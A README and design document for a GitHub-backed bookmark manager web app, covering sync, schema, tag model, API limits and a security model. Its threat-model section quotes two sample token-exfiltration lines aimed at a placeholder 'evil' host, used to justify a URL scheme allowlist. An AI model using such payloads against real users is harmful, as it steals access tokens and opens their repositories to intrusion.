# Bookmark Manager

A client-side SPA that uses a **private GitHub repository as its database**. No server, no
hosting bill, no vendor lock-in — your bookmarks are a versioned JSON file you own.

> This README is the **source of truth** for this project, per `AI_RULES_V1.13.md`.
> Every commit updates this file. Phases are numbered; sub-tasks are lettered; both carry
> checkmarks.

---

## 1. Architecture Overview

```
+---------------------------------------------------------------+
|                      Client Browser (SPA)                     |
|                                                               |
|   [ UI ] <--> [ Store ] <--> [ Sync Engine ] <--> [ API ]     |
|                   |               |                           |
|            [ IndexedDB ]    [ Outbox Queue ]                  |
|            (local mirror)   (durable, offline-safe)           |
+---------------------------------------------------------------+
                              |
              HTTPS · GitHub REST API · Fine-grained PAT
                              v
+---------------------------------------------------------------+
|                     GitHub Cloud Infrastructure               |
|                                                               |
|   [ Private Repo ] --> [ data/bookmarks.json ]                |
|          |                                                    |
|          +--> [ Actions: metadata enrichment, link checker ]  |
+---------------------------------------------------------------+
```

The **Sync Engine** is the heart of the system and the only genuinely hard component. It owns
conflict resolution, the write queue, rate-limit backoff, and offline durability. Everything
else is a thin shell around it.


### 1.1 Target Profile

Recorded because it justifies several decisions that would otherwise look under-engineered:

| Dimension | Value | Consequence |
|-----------|-------|-------------|
| Collection size | **Under 500 bookmarks** (~300 KB) | Comfortably inside the 1 MB Contents API ceiling. D5 stands; the Git Data API migration and sharding are deferred indefinitely. List virtualisation is unnecessary. |
| Existing collection | **Small, to be imported** | Import stays in Phase 4. Hand-entry is adequate for testing until then. |
| Platforms | **Desktop, Android, iOS/iPadOS, and e-ink** | Full Phase 5 is justified. E-ink is a real device but its support is deferred to Phase 7 by decision (D14, §1.2). |
| Origin | **`username.github.io`** — no custom domain (D10) | Shared-origin exposure (§5.1) is live and permanent. D8 resolves to the constrained branch of §5.5. |

At this scale the interesting problems are **correctness and trust**, not throughput: never
losing a bookmark, never resurrecting a deleted one, never leaking the token. Performance work
is explicitly not where effort belongs.

### 1.2 E-Ink Support — Deferred to Phase 7

E-ink is a real target device (§1.1) but is **explicitly deferred to Phase 7 polish** by
decision (D14). The MVP is built for conventional displays; the rules below are the Phase 7
specification, recorded now so the work is scoped rather than rediscovered.

* **No animation or transition** in e-ink mode. E-ink renders animation as smearing.
* **No spinners or skeleton loaders** — loading states become static text (`Syncing…`,
  `Offline — 3 queued`). A spinner on e-ink is a strobing artefact.
* **Pure black on pure white.** No grey text, no low-contrast secondary labels, no
  colour-only signalling; borders and weight carry hierarchy instead.
* **No hover-dependent affordances** — every action reachable by tap and by keyboard.
* **Large hit targets, static layout** — nothing that reflows after paint.

**Two habits make the deferral cheap**, and cost nothing during the MVP:

* Put every colour behind a **design token** from 1e onward. The Phase 7 e-ink theme then
  becomes a palette swap rather than an audit of every component.
* Don't add animation that would only have to be removed. Motion is not an MVP requirement,
  so declining to build it is free.

The remainder — pagination, contrast, hit targets — is genuinely retrofittable and does not
need to shape the MVP. Note that **pagination is in the MVP regardless** (7c), justified by
scale alone: under 500 bookmarks, virtualisation buys nothing.
---

## 2. Architectural Decisions

Decisions are recorded here rather than rediscovered. Items marked **OPEN** require sign-off
before the phase that depends on them begins.

| # | Decision | Choice | Rationale |
|---|----------|--------|-----------|
| D1 | Framework | **Svelte 5 + TypeScript + Vite** | Small bundle, no VDOM overhead on long lists, compiles away. |
| D2 | Styling | **Tailwind CSS** | Token-driven theming for dark / e-ink high-contrast modes. |
| D3 | Storage target | **Private repo only — no Gists** | Secret Gists are readable by anyone with the URL, and fine-grained PAT support for the Gists API is limited. |
| D4 | API layer | **Hand-rolled `fetch` wrapper** | `@octokit/rest` is heavy for the ~6 endpoints used, and we need custom retry/ETag logic anyway. |
| D5 | Write API | **Contents API. Git Data API deferred indefinitely** | At under 500 bookmarks (§1.1) the 1 MB ceiling is ~3x away. Revisit only if the file passes 700 KB; 3g is the tripwire. |
| D6 | Conflict model | **Per-record last-write-wins with tombstones** | A true CRDT is overkill for single-user multi-device. Field-level merge may come later. |
| D7 | Local cache | **IndexedDB mirror + durable outbox** | Optimistic UI without durable queueing loses data on failed commits. |
| D8 | Token storage | **RESOLVED — `sessionStorage` default, `localStorage` opt-in behind an explicit warning** | D10 answered "no custom domain", so §5.5's `*.github.io` branch applies. The mobile friction is real and is the honest cost of a shared origin; D13 proposes a mitigation. |
| D9 | Hosting | **GitHub Pages via `actions/deploy-pages`** | Official path; the `gh-pages` branch pattern is deprecated. |
| D10 | Custom domain | **RESOLVED — no. Hosting on `username.github.io`** | Accepted consequence: the §5.1 shared-origin exposure is permanent, and D8 takes its constrained form. A dedicated GitHub account for hosting remains the cheapest way to shrink it. |
| D11 | Encryption at rest | **OPEN — default NO** | Zero-knowledge encryption would kill readable diffs and rule out Actions-based enrichment (§9). |
| D12 | Taxonomy | **Tags only, `/`-delimited, lowercase canonical, descendant-inclusive filtering** | Folders and tags were two overlapping taxonomies. Derived tree nodes make an inconsistent hierarchy unrepresentable (§3.3). |
| D13 | Token at rest | **OPEN — PIN-wrapped `localStorage` proposed** | Would replace re-pasting a 93-character PAT with a short PIN while keeping sibling pages on the shared origin locked out. Needs sign-off before Phase 1b. |
| D14 | E-ink support | **Deferred to Phase 7 polish, after the MVP** | User decision. Two zero-cost habits during the MVP keep the deferral cheap: colour behind design tokens, and no animation built that would only be removed (§1.2). |

---

## 3. Data Schema (`data/bookmarks.json`)

```json
{
  "schemaVersion": 2,
  "updatedAt": "2026-08-23T08:00:00Z",
  "tagMeta": {
    "tools": { "color": "#4f8", "order": 1 },
    "dev/rust": { "label": "Dev/Rust" }
  },
  "bookmarks": [
    {
      "id": "01J8XQ2K7M3N4P5R6S7T8V9W0X",
      "url": "https://example.com/page?utm_source=x",
      "urlKey": "example.com/page",
      "title": "Example Resource",
      "description": "Short summary or context",
      "notes": "",
      "tags": ["tools", "dev/reference"],
      "favicon": null,
      "pinned": false,
      "archived": false,
      "createdAt": "2026-08-20T08:00:00Z",
      "updatedAt": "2026-08-23T08:00:00Z",
      "deletedAt": null,
      "enrichedAt": null
    }
  ]
}
```

### 3.1 Schema Rules

* **`schemaVersion` is an integer**, with an explicit migration ladder (`v1 -> v2 -> v3`).
  Every migration is a pure function, unit-tested, applied on load.
* **`updatedAt` is mandatory on every record.** Without it, merging is impossible.
* **`deletedAt` is a tombstone, not a removal.** Hard-deleting a record makes it reappear on
  the next sync from another device. Tombstones are pruned after 90 days.
* **`urlKey` is the normalized dedupe key** — lowercase host, `www.` stripped, tracking
  params (`utm_*`, `fbclid`, `gclid`, `ref`) removed, trailing slash dropped, fragment
  dropped unless it looks like a SPA route. Adding an existing `urlKey` updates in place
  rather than duplicating.
* **No top-level `tags` array.** The tag list is *derived* from bookmark membership at
  runtime. `tagMeta` holds presentation metadata only (colour, sort order) and may contain
  keys for tags with zero members.
* **One taxonomy, not two.** Folders are gone; hierarchy is expressed as `parent/child` tag
  paths. This removes the folder/tag ambiguity entirely. Full model in §3.3.
* **Tags are canonically lowercase** and normalised on every write path (§3.3.3), so no two
  spellings of the same tag can coexist.
* **IDs are ULIDs** — sortable by creation time, collision-safe, and unlike
  `crypto.randomUUID()` they carry no secure-context requirement.
* **Serialization is deterministic**: keys sorted, `bookmarks` sorted by `id`, two-space
  indent, trailing newline. The storage layer is git — readable diffs are free, and stable
  ordering sharply reduces merge conflicts.
* **Every load is validated** with a zod schema. A hand-edited or truncated file must
  surface a repairable error, never a white screen.

### 3.2 Merge Algorithm

```
merge(local, remote):
  1. Union both bookmark sets by `id`.
  2. For an id in both: keep the record with the greater `updatedAt`.
  3. On an exact `updatedAt` tie: the tombstone wins (delete beats edit).
  4. Union tagMeta; remote wins per-key on tie.
  5. Drop tombstones older than 90 days.
  6. Recompute top-level `updatedAt`.
```

Merge is a pure function over two JSON documents with no I/O. It is the highest-risk code in
the project and therefore the most heavily tested (see Phase 0d).


### 3.3 Tag Model

Tags are the **only** taxonomy. There are no folders, no parent pointers, and no stored tree.
A tag is a single string that may contain `/`, and hierarchy is a rendering convention applied
to that string.

```
tags: ["dev/rust/async", "reading-list"]     <- two tags, not four
```

Rendered:

```
dev                  (derived node)
└── rust             (derived node)
    └── async        <- the bookmark is here
reading-list         <- and here, at the same time
```

#### 3.3.1 Derived Nodes Are Not Stored Tags

Ancestor segments materialise as tree nodes at render time. They are **never** written into a
record's `tags` array. A bookmark tagged `dev/rust/async` is *not* tagged `dev`; its array
stays exactly `["dev/rust/async"]`.

The rejected alternative — storing every ancestor (`["dev", "dev/rust", "dev/rust/async"]`) —
fails on three counts:

* **Redundancy.** Ancestors are recoverable from the leaf by splitting on `/`. Storing them
  inflates every record and every commit diff for no information gain.
* **Sync consistency.** Ancestor sets would become state that two devices could disagree
  about — a merge could produce a record tagged `dev/rust/async` but missing `dev/rust`.
  Deriving them makes that class of corruption unrepresentable.
* **Cleanup.** Deleting the last `dev/rust/async` bookmark removes the `dev/rust` node
  automatically, because the node only ever existed as a projection. Stored ancestors would
  need a garbage-collection pass, which is another thing to get wrong.

The tree is a pure function of the tag strings present. It cannot drift, because there is
nothing to drift from.

`tagMeta` may still carry an entry for a derived node — a colour on `dev`, say — even though
no record is literally tagged `dev`. That is presentation state, not membership.

#### 3.3.2 Filtering Includes Descendants

Selecting a node matches that tag **and everything beneath it**. Clicking `dev` returns
bookmarks tagged `dev`, `dev/rust`, and `dev/rust/async` alike. Implemented as a prefix match
on `tag === selected || tag.startsWith(selected + "/")` — never a bare `startsWith`, which
would wrongly match `development` when `dev` is selected.

Each node shows two counts: bookmarks tagged exactly here, and the descendant-inclusive total.

#### 3.3.3 Canonical Form

Tags are stored **lowercase**. Normalisation is applied on every write path — manual entry,
import, enrichment, and migration — so no two spellings of the same tag can coexist.

| Step | Rule |
|------|------|
| 1 | Unicode NFC normalise. Without this, two byte-sequences for `café` become two distinct tags. |
| 2 | Lowercase (locale-independent). `Dev/Rust` and `dev/rust` are the same tag. |
| 3 | Split on `/`; trim whitespace from each segment; collapse internal whitespace runs to a single space. |
| 4 | Drop empty segments — this collapses `//` and strips leading and trailing slashes. |
| 5 | Strip control characters (§5.4). |
| 6 | Rejoin with `/`. |
| 7 | Reject if depth > 5 segments, any segment > 64 characters, or the whole tag > 200 characters. |

`  Dev // Web  Development /  Rust  ` normalises to `dev/web development/rust`.

Spaces inside segments are kept rather than hyphenated — browser bookmark folders are full of
them, and silently rewriting `Web Development` to `web-development` surprises people more than
it helps.

**Display case is recoverable.** `tagMeta[tag].label` may hold a presentation string
(`"Dev/Rust"`) shown in the UI while the canonical lowercase form remains the matching key. The
label never participates in comparison, filtering, or merge.

#### 3.3.4 Consequences at Import

Browser exports carry arbitrary folder names — mixed case, punctuation, trailing spaces,
inconsistent depth. Folder paths map directly to tag paths through §3.3.3, which is precisely
where near-duplicate tags would otherwise be created (`Development`, `development`,
`Development ` as three sidebar entries). Normalisation collapses them on the way in, and the
import preview must show the collapse before it is applied.

---

## 4. GitHub API Contract

### 4.1 Endpoints

| Operation | Endpoint | Notes |
|-----------|----------|-------|
| Probe / read | `GET /repos/{owner}/{repo}/contents/{path}` | Send `If-None-Match` with the cached ETag. A `304` costs no rate-limit quota. |
| Read (large) | `GET /repos/{owner}/{repo}/contents/{path}` with `Accept: application/vnd.github.raw` | Required above 1 MB — see §4.3. |
| Write | `PUT /repos/{owner}/{repo}/contents/{path}` | Requires `message`, `content` (base64), `sha`. |
| Write (Phase 4+) | Git Data API: blob -> tree -> commit -> ref | Removes size ceiling; enables atomic multi-file commits. |
| Change detection | `GET /repos/{owner}/{repo}/commits?path={path}&per_page=1` | Polled on window focus, ETag-conditional. |

### 4.2 Base64 Handling — Read This Before Writing Any Code

`btoa()` **throws on any character outside Latin-1**. A single emoji or accented character in
a page title breaks every write. Encoding must go through binary:

```ts
// encode: string -> base64
const bytes = new TextEncoder().encode(json);
const b64 = btoa(String.fromCharCode(...bytes));   // chunk for large inputs

// decode: base64 -> string
const bin = atob(b64.replace(/\n/g, ""));
const buf = Uint8Array.from(bin, c => c.charCodeAt(0));
const json = new TextDecoder().decode(buf);
```

The spread in `String.fromCharCode(...bytes)` blows the call stack on large arrays — chunk in
8 KB blocks. Both helpers are unit-tested against an emoji-and-CJK fixture in Phase 0d.

### 4.3 The 1 MB Ceiling

#### Why it exists

`GET /repos/{owner}/{repo}/contents/{path}` returns file content **inlined as a base64 string
inside a JSON response**. GitHub will not inline an arbitrarily large file, so the endpoint
behaves in three bands:

| File size | Behaviour |
|-----------|-----------|
| **≤ 1 MB** | Fully supported. `content` holds the base64 payload, `encoding` is `"base64"`. |
| **1–100 MB** | The request still succeeds, but `content` comes back as an **empty string** and `encoding` as `"none"`. Only the raw and object media types return the actual bytes. |
| **> 100 MB** | The endpoint does not support the file at all. The Git Data blobs API is the only route. |

The failure mode is what makes this dangerous: crossing 1 MB does not produce an error. It
produces a **successful response containing an empty file**, which a naive client will happily
parse as "no bookmarks" and then commit back over the real data. Any implementation must treat
`encoding: "none"` as a hard error, never as empty content.

Two aggravating factors specific to this design:

* **Base64 inflates payloads by ~33%.** A 1 MB file is ~1.37 MB on the wire, in both
  directions.
* **The whole file is rewritten on every change.** Cost scales with total collection size, not
  with the size of the edit — adding one bookmark to a 900 KB file uploads 900 KB.

At roughly 600 bytes per record, the wall sits at **~1,700 bookmarks**. Against the target of
under 500 (~300 KB), there is roughly 3x headroom, which is why D5 defers the fix and 3g
merely watches for it.

#### Workarounds, cheapest first

1. **Read with `Accept: application/vnd.github.raw`.** Returns the bytes directly — no JSON
   wrapper, no base64, no 33% inflation. Covers 1–100 MB. *Trade-off:* the raw response does
   not carry the blob `sha` that the next `PUT` requires, so the sha must come from a separate
   conditional request. One extra round trip, and the `sha` and content must be captured
   together or a write can be built on a mismatched pair.
2. **Read via the Git Data blobs API** — `GET /repos/{o}/{r}/git/blobs/{sha}` with the raw
   media type, supporting up to 100 MB. Needs the blob sha from the tree API first, so it
   costs more round trips than option 1 for no gain below 100 MB.
3. **Write via the Git Data API** — create blob, create tree, create commit, update ref. Four
   requests instead of one, but no size ceiling and **atomic multi-file commits**, which is a
   prerequisite for sharding.
4. **Split hot from cold.** Keep recent bookmarks in `bookmarks.json` and move archived ones
   to `archive.json`, loaded lazily. Simple, and it shrinks the file rewritten on every edit.
5. **Shard by id prefix** — `bookmarks-{00..0f}.json`. Only the touched shard is rewritten, so
   writes get smaller and conflicts get rarer. Costs: requires option 3 for atomicity,
   complicates the merge algorithm, and search must load every shard.
6. **Trim the record.** Descriptions and notes are the bulk of the payload; moving them to a
   side file keyed by id would cut the main file several-fold. Favicons must stay as URLs —
   inlining them as data URIs would blow the ceiling almost immediately.

#### Rejected

* **Compression (gzip the JSON, store as binary).** Would multiply headroom, but destroys
  readable diffs and merge-friendliness — the entire reason for using git as the store.
* **`raw.githubusercontent.com`.** Serves raw files without the API's size limits, but does
  not return permissive CORS headers for authenticated private-repo requests, so it is not
  reachable from browser JavaScript. Not an option here.

### 4.4 Rate Limits & The Write Queue

Authenticated PATs get 5,000 requests/hour, but the **secondary** limits are the real
constraint: GitHub expects content-modifying requests to be serialized, with roughly a second
between writes to the same repository. A commit per keystroke will get the client blocked.

The write queue therefore guarantees:

* **Single in-flight write.** Never concurrent, never parallel.
* **Debounced flush** — coalesce edits, flush after ~3 s idle or on page hide.
* **Exponential backoff** honouring `Retry-After` and `x-ratelimit-reset`.
* **Batched commits** — one commit may carry many logical edits, with a summarizing message
  (`"chore: sync 7 bookmark changes"`).

### 4.5 Error Taxonomy

| Status | Meaning | Handling |
|--------|---------|----------|
| `401` | Token invalid or expired | Re-auth modal; **preserve unsynced local edits**. |
| `404` | Repo missing **or** no permission | GitHub returns 404 rather than 403 to avoid leaking repo existence — the message must cover both causes. |
| `404` on path | First run, file absent | Bootstrap: create `data/bookmarks.json` with an empty document. |
| `409` | Stale `sha` | Refetch -> merge -> retry, max 3 attempts, then surface a conflict UI. |
| `403` + `x-ratelimit-remaining: 0` | Rate limited | Park the queue until `x-ratelimit-reset`; show a countdown. |
| `422` | Malformed payload | Log, do not retry, surface a bug report affordance. |
| Network failure | Offline | Queue persists in IndexedDB; retry on `online` event. |

---

## 5. Security Model

**Threat model in one line:** the page is public and that is fine — it ships no credentials.
The asset worth stealing is the user's PAT, which exists only in their own browser. Every rule
below protects that one secret, and the fine-grained token scope caps the damage if it leaks.

A stranger opening the app URL sees an empty first-run modal and nothing else. The realistic
compromise is **script execution on the app's own origin**, covered in §5.1 and §5.4.

### 5.1 The GitHub Pages Origin Problem

**`username.github.io` is a single origin shared by every project you host there.** Any other
page ever deployed under that account — an old demo, a half-finished experiment with an XSS
hole — can read this app's `localStorage` and obtain a token with write access to a private
repo.

Mitigations, best first:

1. **Serve from a custom domain** (decision D10) so the app owns its origin.
2. Use a **dedicated GitHub account** for hosting.
3. Default to **`sessionStorage`** (D8) so the token dies with the tab; `localStorage` is
   opt-in behind an explicit, plainly worded warning.

### 5.2 Hardening Rules

* **Strict CSP** shipped as a meta tag and verified in CI:
  `default-src 'self'; connect-src 'self' https://api.github.com; img-src 'self' data: https:;
  object-src 'none'; base-uri 'none'`.
* **Zero third-party scripts.** No analytics, no CDN fonts, no tag managers. Every one is a
  token-exfiltration surface.
* **Fine-grained PAT**, scoped to `Contents: Read & Write` on **one** repository. Nothing else.
* **Token expiry is a first-class UX state.** Fine-grained PATs expire; warn at 7 days
  remaining, and never lose local edits at the 401 boundary.
* The token is **never** written to a URL, a log line, or an error report.

### 5.3 Privacy Caveat — Git History Is Permanent

Deleting a bookmark removes it from the current file, **not from the repository's history**.
Every URL ever saved remains recoverable from the commit log. This is stated plainly in the
onboarding flow. Users needing true erasure must rewrite history or start a fresh repo.

Client-side AES-GCM encryption (D11) would solve this but forfeits readable diffs and
Actions-based enrichment. Default is **off**.

### 5.4 Untrusted Content Handling

Almost everything this app renders is attacker-influenceable: URLs and titles come from
`bookmarks.json`, from imported files (§11, 4b–4c), and from pages scraped by the enrichment
Action (§13, 6a). Any script execution on this origin reads the PAT out of storage, so these
rules are load-bearing, not hygiene.

* **URL scheme allowlist — `http:` and `https:` only.** Enforced twice: on save, and again at
  render time. A bookmark whose URL is `javascript:fetch('https://evil/?t='+sessionStorage.token)`
  executes in this origin the moment it is clicked. `data:`, `blob:`, `file:` and `vbscript:`
  are rejected the same way. Rejected URLs are shown as inert text with a warning badge, never
  as an anchor.
* **Never `{@html}`.** No value originating from the JSON file, an import, or the enrichment
  Action may be rendered as raw HTML. Svelte escapes by default; the risk is a single
  well-meaning exception. Enforced by an ESLint rule in CI, not by discipline.
* **Sanitize at the import boundary.** Bookmark HTML files are arbitrary attacker input. Parse
  with `DOMParser` into a detached document, read `textContent` only, strip control characters,
  and cap field lengths before anything reaches the store.
* **Treat the enrichment Action as untrusted output.** It scrapes `<title>` and meta tags from
  arbitrary third-party sites and commits the result into the repo. Strip control characters
  and cap lengths inside the Action, and validate again on load — the file is not trusted
  merely because it came from our own workflow.
* **Minimal dependency surface.** One compromised package with access to the page defeats every
  other control here. Few dependencies, committed lockfile, `npm ci` in CI, no post-install
  scripts, and no runtime CDN fetches.
* **Favicons are images, not trust.** Load them via `img-src`, never inline remote SVG — an
  inline SVG is a script execution vector.

**What CSP does and does not buy.** The policy in §5.2 blocks `fetch`/XHR to any host but
`api.github.com`, which is real defence in depth. It does **not** stop exfiltration by
navigation (`location = 'https://evil/?t=' + token`), and it cannot stop an attacker with
script execution from vandalising the repo through the endpoint we must allow. CSP raises the
cost of a compromise; the scheme allowlist and the escaping rules are what prevent one.

**Blast radius if the token leaks anyway:** contents of one private repository — read and
write. Not the account, not other repositories, not SSH keys, not Actions secrets. That
containment is the entire reason for the fine-grained scope in §5.2.

### 5.5 Token Storage — Conditional on Origin and Install State

`sessionStorage` was originally chosen as a flat default (D8). That is wrong on mobile.
**`sessionStorage` is scoped to a browsing context**, and Android kills backgrounded PWAs
routinely — so every cold launch of an installed app presents an empty store and demands the
PAT again. Nobody re-pastes a fine-grained token several times a week. In practice every
mobile user would take the `localStorage` opt-in, and "secure by default" would be theatre.

The safety of `localStorage` depends entirely on whether the app owns its origin (§5.1), so
the default is conditional rather than flat:

| Origin | Context | Default | Reasoning |
|--------|---------|---------|-----------|
| Custom domain (D10) | Installed PWA | `localStorage` | App owns the origin; no sibling pages exist to read it. Re-auth on every launch would be unusable. |
| Custom domain (D10) | Browser tab | `localStorage`, opt-out available | Same origin isolation; the tab is simply less persistent. |
| `*.github.io` | Installed PWA | `sessionStorage`, `localStorage` opt-in behind an explicit warning | Origin is shared with every other project on the account. The friction is the honest cost of that choice. |
| `*.github.io` | Browser tab | `sessionStorage` | Highest exposure, lowest need for persistence. |
| Shared or public device | Any | `sessionStorage`, forced | Offered as a "public computer" toggle in the first-run modal. |

This makes the custom-domain question (§16.1) materially more than a nicety: **it is what
decides whether the mobile experience can be both usable and safe.** Detection is
`window.matchMedia('(display-mode: standalone)')` plus an origin check, evaluated at startup
and surfaced in Settings so the user can see which mode they are in and why.

---

## 6. Background Execution & Platform Limits

The app **never runs continuously in the background**. Leaving it means Android (or any OS)
freezes the page and may kill it outright under memory pressure. The only thing that survives
is the service worker, which is event-driven: it wakes for a registered event, gets tens of
seconds of execution, and is killed again. There is no persistent process, and the design must
not assume one.

### 6.1 Wake Mechanisms

| Mechanism | Availability | Used for |
|-----------|--------------|----------|
| **Background Sync** (`sync`) | Chrome / Edge / Samsung on Android. Not Firefox, not iOS. | **Primary.** Flushes the outbox when connectivity returns, with the app closed. |
| **Periodic Background Sync** (`periodicsync`) | Chrome only, installed PWA only, interval chosen by the browser (~12 h in practice, tied to engagement score) | Not used. Too unreliable to build on; treat any firing as a bonus. |
| **Web Push** | Requires a push service and VAPID keys | **Rejected.** Technically deliverable from a GitHub Action, but it means storing push subscription endpoints in the repo. Not worth the complexity or the privacy cost. |
| **Web Share Target** | Chrome / Android, installed PWA | Launches the app in the foreground — not a background mechanism. |

### 6.2 The Case That Matters

A bookmark shared while offline — on a train, in a lift — sits in the local outbox with nothing
on GitHub yet. If the user then closes the app, the save must still complete.

* **Chrome on Android:** Background Sync fires on reconnect and the service worker commits it
  with the app closed. Invisible to the user.
* **Firefox on Android, and iOS:** no Background Sync. The outbox flushes on next app open.
  Later, never lossy.

Pulling *remote* changes **while the app is closed** is deliberately not implemented.
Sync-on-open against a warm cache takes a few hundred milliseconds; true background polling
would burn battery and rate limit for no perceptible gain.

**Foreground refresh is a separate matter.** A device left open and focused all day would
otherwise never re-check — add a bookmark on a phone at noon and a laptop tab untouched since
morning stays stale indefinitely, because the focus trigger (3f) only fires on a focus
*change*. A low-frequency poll while the document is visible closes that gap almost for free:
the request is ETag-conditional, so an unchanged file returns `304` and costs no rate-limit
quota. The poll runs only when `document.visibilityState === 'visible'`, and stops entirely
when hidden.

### 6.3 Storage Eviction — The Real Risk

Android evicts IndexedDB under storage pressure, and the outbox lives in IndexedDB. Eviction
with unsynced bookmarks queued means **silent data loss**.

* Request `navigator.storage.persist()` at install time; Chrome generally grants it to
  installed PWAs.
* Surface the result in Settings. If persistence was **denied**, the app must say so plainly
  rather than quietly risking the queue.
* Warn in-app whenever the outbox is non-empty and persistence is unavailable.

### 6.4 Installation Is a Prerequisite, Not a Nicety

"Install" here is not an app-store download — there is no APK and nothing to publish. The
browser gives the existing page an app presence: launcher icon, standalone window, its own
entry in the app switcher. Same code, same origin, same storage. But three things depend on
it:

* **Web Share Target only exists for installed apps.** Android offers share targets from
  installed apps only, so 5b — the primary mobile capture path — does not function at all
  until the user installs. On mobile, install *is* the capture story.
* **Storage persistence is granted on install.** `navigator.storage.persist()` (§6.3) is
  heuristic and Chrome weights installation heavily. Installed generally succeeds; a plain tab
  generally does not. This is the difference between an outbox that survives storage pressure
  and one that is silently evicted.
* **Token persistence policy keys off it** (§5.5).

**Install paths differ sharply by platform:**

| Platform | Trigger | Notes |
|----------|---------|-------|
| Chrome — Android / desktop | `beforeinstallprompt` | Capture the event, `preventDefault()`, stash it, surface a custom Install button. One shot per session; a dismissal means no refire. |
| Safari — iOS | **None. Cannot be triggered programmatically.** | Detect iOS and render illustrated Share -> "Add to Home Screen" instructions. The result still has no Share Target and no Background Sync. |
| Firefox — Android | "Add to Home screen" | Installs, but gains neither Share Target nor Background Sync. |

The install prompt frequently becomes available *during* first-run setup, before the user has
any reason to want it. Stash the event and re-surface the offer once the first bookmark has
been saved, when the value is obvious.

---
## 6.5 Build Status

The MVP is implemented and green. `npm run verify` runs lint, typecheck, tests, and build.

| Area | State |
|------|-------|
| Tests | 103 passing across 7 files |
| Coverage focus | merge algorithm, base64 round-trip, URL/tag normalisation, migrations, error taxonomy, store integration |
| Bundle | ~128 KB raw / ~39 KB gzipped |
| Checks | eslint (incl. `svelte/no-at-html-tags`), svelte-check, CSP assertion — all clean |

Commands: `npm run dev` to develop, `npm test` to test, `npm run verify` before committing.

---

## 7. Phase 0 — Foundations

* [x] **0a.** Scaffold Svelte 5 + TypeScript + Vite + Tailwind; strict `tsconfig`.
* [x] **0b.** Module layout: `src/lib/api/`, `src/lib/sync/`, `src/lib/schema/`,
  `src/lib/ui/`. No file exceeds 2,000 lines (per `AI_RULES_V1.13.md`).
* [x] **0c.** Zod schema + migration ladder (`v1 -> v2`), with deterministic serializer.
* [x] **0d.** Test harness (Vitest) + mocked GitHub API. Required coverage from day one:
  merge algorithm, base64 round-trip (emoji/CJK fixture), URL normalization, migrations.
* [x] **0e.** CI workflow: typecheck, lint, test, build on every push.
* [x] **0f.** Deploy workflow using `actions/upload-pages-artifact` + `actions/deploy-pages`;
  copy `index.html` to `404.html` so client-side routes survive a refresh.
* [x] **0g.** CSP meta tag in the app shell, asserted by a CI check.
* [x] **0h.** ESLint rule banning `{@html}`, plus a dependency policy — committed
  lockfile, `npm ci`, no post-install scripts, no runtime CDN fetches (§5.4).

## 8. Phase 1 — MVP: Connect, Read, Search

* [x] **1a.** First-run modal: PAT + `owner/repo` + path, with a live connectivity probe.
* [x] **1b.** Token store honouring D8 (`sessionStorage` default, `localStorage` opt-in).
  D13 (PIN-wrapping) would sit behind the same interface without changing callers.
* [x] **1c.** Read path: fetch, decode, validate, migrate, hydrate store; cache the ETag.
* [x] **1d.** Bootstrap flow — create `data/bookmarks.json` when the path 404s.
* [x] **1e.** Bookmark list UI: title, host, description, tags, favicon placeholder. Colours
  behind design tokens so the Phase 7 e-ink theme is a palette swap, not an audit (§1.2).
* [x] **1f.** Instant local search across title / URL / description / tags, debounced,
  ranked (title match beats description match).
* [x] **1g.** Tag tree sidebar built by splitting stored tags on `/` — derived nodes only,
  never stored ancestors (§3.3.1). Click to filter, multi-select, and show both the exact
  and descendant-inclusive counts per node.
* [x] **1j.** Descendant-inclusive filtering via `tag === sel || tag.startsWith(sel + "/")`.
  A bare `startsWith` would match `development` when `dev` is selected — unit-tested
  against exactly that case (§3.3.2).
* [x] **1h.** Full error taxonomy (§4.5) surfaced as human-readable states.
* [x] **1i.** Render-time URL scheme allowlist (`http:`/`https:`). Anything else renders
  as inert text with a warning badge, never as a clickable anchor (§5.4).

## 9. Phase 2 — Write Path

* [x] **2a.** Quick-add modal — keyboard-driven, URL-first, tag autocomplete.
* [x] **2b.** Edit and delete (delete writes a tombstone, never removes the record).
* [x] **2c.** Write queue: single in-flight, 3 s debounce, batched commits.
* [ ] **2d.** Backoff honouring `Retry-After` / `x-ratelimit-reset`. *Partial: the client
  parses both headers into `GitHubError.retryAt`; the queue does not yet park on them.*
* [x] **2e.** Optimistic UI with rollback on terminal failure.
* [x] **2f.** Descriptive commit messages (`feat: add "Title"`, `chore: sync N changes`).
* [x] **2g.** Dedupe on add via `urlKey` — offer "update existing" instead of duplicating.
* [x] **2h.** Save-time URL validation and field-length caps, sharing one validator with
  1i so the two boundaries cannot drift apart (§5.4).
* [x] **2i.** Tag normalisation (§3.3.3) applied on every write path, in one shared
  function. Autocomplete matches on the canonical form and displays `tagMeta.label` where
  present. Fixture-tested: NFC pairs, mixed case, `//`, padded segments, depth and length
  limits.

## 10. Phase 3 — Sync & Resilience

* [x] **3a.** Merge algorithm (§3.2) wired into the 409 retry path.
* [ ] **3b.** IndexedDB mirror — app renders instantly from cache, syncs behind.
* [ ] **3c.** Durable outbox surviving reload, tab close, crash, and OS process kill.
* [ ] **3d.** Offline mode: full read/write locally, flush on reconnect.
* [ ] **3e.** Multi-tab safety via `navigator.locks` + `BroadcastChannel`.
* [ ] **3f.** Remote-change detection on window focus; "remote updated — refresh?" banner.
* [ ] **3g.** Size tripwire — warn in Settings when `bookmarks.json` passes 700 KB, and
  only then implement raw media-type reads (§4.3). At the target scale (§1.1) this should
  never fire; it exists so the ceiling cannot arrive unannounced. Must also treat
  `encoding: "none"` as a hard error — silently parsing it as empty would commit over the
  whole collection.
* [ ] **3h.** Tombstone pruning at 90 days.
* [ ] **3i.** Request `navigator.storage.persist()` at install; expose the grant/deny state
  in Settings and warn whenever the outbox is non-empty without persistence (§6.3).
* [ ] **3j.** Register a Background Sync (`sync`) handler in the service worker so a queued
  save completes with the app closed; fall back to flush-on-open where unsupported (§6.1).
* [ ] **3k.** Foreground refresh poll — ETag-conditional, default 5 minutes, running only
  while `document.visibilityState === 'visible'` and suspended when hidden, offline, or
  rate-limited. Closes the stale-open-tab gap that 3f cannot cover (§6.2).

## 11. Phase 4 — Scale & Portability

* [ ] ~~**4a.** Migrate writes to the Git Data API.~~ **Deferred indefinitely** (D5) — the
  Contents API is sufficient under 500 bookmarks. Reinstate only if 3g fires.
* [ ] **4b.** Import: Netscape bookmarks HTML (every browser exports this format).
* [ ] **4c.** Import: Raindrop / Pocket / Pinboard JSON + generic CSV.
* [ ] **4d.** Export: Netscape HTML and raw JSON. No lock-in, by design.
* [ ] **4e.** Bulk dedupe pass over `urlKey` with a review-before-apply UI.
